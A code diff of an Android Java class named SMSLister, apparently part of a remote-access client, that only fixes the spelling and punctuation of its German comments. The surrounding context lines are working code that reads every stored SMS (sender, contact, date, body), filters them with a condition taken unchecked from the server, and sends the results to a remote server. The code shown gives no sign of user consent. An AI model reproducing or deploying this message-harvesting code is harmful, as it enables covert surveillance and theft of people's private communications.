@@ -10,7 +10,7 @@ import Packet.SMSTreePacket;
 import my.app.client.ClientListener;
 
 /**
- * Diese Klasse extrahiert alles auf dem Gerät befindlichen SMS und schickt diese an den Server
+ * Diese Klasse extrahiert alle, auf dem Gerät befindlichen, SMS und schickt diese an den Server.
  */
 public class SMSLister {
 
@@ -19,15 +19,15 @@ public class SMSLister {
 
 	/**
 	 * Diese Funktion erstellt eine Abfrage für die gespeicherten SMS.
-	 * Zusätzlich wird hier der Filter eingbeaut, sofern nach bestimmten Telefonnummern oder Schlüsselwörtern gesucht werden soll.
-	 * @param c	 Der Service der diese Methode aufruft
-	 * @param channel	Der Kanal zur Datenübertragung
-	 * @param args	Hierbei handelt es sich um die Argumente nachden die SMS gefilter werden sollen
+	 * Zusätzlich wird hier der Filter übergeben, sofern nach bestimmten Telefonnummern oder Schlüsselwörtern gesucht werden soll.
+	 * @param c	 Der Service der diese Methode aufruft.
+	 * @param channel	Der Kanal zur Datenübertragung.
+	 * @param args	Hierbei handelt es sich um die Argumente, nachden die SMS gefiltert werden sollen.
 	 * @return	true wenn es SMS gibt, false wenn nicht.
 	 */
 	public static boolean listSMS(ClientListener c, int channel, byte[] args) {
 		/**
-		 * In der ArrayList l werden alles SMSPackete gespeichert. Aus diesem Array wird später das Paket welches an den Server gesendet wird
+		 * In der ArrayList l werden alle SMSPackete gespeichert. Aus diesem Array wird später das Paket, welches an den Server gesendet wird.
 		 */
 		ArrayList<SMSPacket> l = new ArrayList<SMSPacket>();
 		/**
@@ -35,7 +35,7 @@ public class SMSLister {
 		 */
 		boolean ret = false;
 		/**
-		 * Hierbei handelt es sich um den Filter. Die SMS werden nachden übergebenen Argumenten gefiltert
+		 * Hierbei handelt es sich um den Filter. Die SMS werden nachden übergebenen Argumenten gefiltert.
 		 */
 		String WHERE_CONDITION = new String(args);
 		/**
@@ -43,11 +43,11 @@ public class SMSLister {
 		 */
 		String SORT_ORDER = "date DESC";
 		/**
-		 * Die Spalten welche ausgelesen werden sollen.
+		 * Die Spalten, welche ausgelesen werden sollen.
 		 */
 		String[] column = { "_id", "thread_id", "address", "person", "date","read" ,"body", "type" };
 		/**
-		 * Die Tabelle die ausgelesen werden soll.
+		 * Die Tabelle, die ausgelesen werden soll.
 		 */
 		String CONTENT_URI = "content://sms/"; //content://sms/inbox, content://sms/sent
 		/**
@@ -56,18 +56,18 @@ public class SMSLister {
 		Cursor cursor = c.getContentResolver().query(Uri.parse(CONTENT_URI), column , WHERE_CONDITION, null, SORT_ORDER);
 
 		/**
-		 * Sollte der cursor Daten enthalten so wird er auf das erste Element der Liste gesetzt.
+		 * Sollte der cursor Daten enthalten, wird er auf das erste Element der Liste gesetzt.
 		 */
         if(cursor.getCount() != 0) {
 	        cursor.moveToFirst();
 	
 	        do{
 				/**
-				 * Hier wird überprüft ob diese Stelle überhaupt Spaöten mit Daten besitzt.
+				 * Hier wird überprüft, ob diese Stelle überhaupt Spalten mit Daten besitzt.
 				 */
 	           if(cursor.getColumnCount() != 0) {
 				   /**
-					* Ist dies der Fall so werden die Inhalte der verschiedenen Spalten in variablen zwischen gespeichert.
+					* Ist dies der Fall so werden die Inhalte, der verschiedenen Spalten, in Variablen zwischen gespeichert.
 					*/
 	        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
 	        	   int thid = cursor.getInt(cursor.getColumnIndex("thread_id"));
@@ -84,11 +84,11 @@ public class SMSLister {
 	           }
 	        }
 			/**
-			 * Dies wird solang wiederholt solange es eine nächste Position für den cursor gibt.
+			 * Dies wird solange wiederholt, wie es eine nächste Position für den cursor gibt.
 			 */
 			while(cursor.moveToNext());
 			/**
-			 * Hier wird der return-Wert auf true gesetzt, was bedeutet, dass es Inhalte der SMSListe gibt.
+			 * Hier wird der return-Wert auf true gesetzt, was bedeutet, dass die SMSList nicht leer ist.
 			 */
 	        ret = true;
         }
@@ -104,7 +104,7 @@ public class SMSLister {
 		 */
 		c.handleData(channel, new SMSTreePacket(l).build());
 		/**
-		 * Return ret damit das Programm weiß ob es eine SMS Liste gab oder nicht.
+		 * Return ret damit das Programm weiß ob SMS-Daten vorhanden sind.
 		 */
 		return ret;
 	}
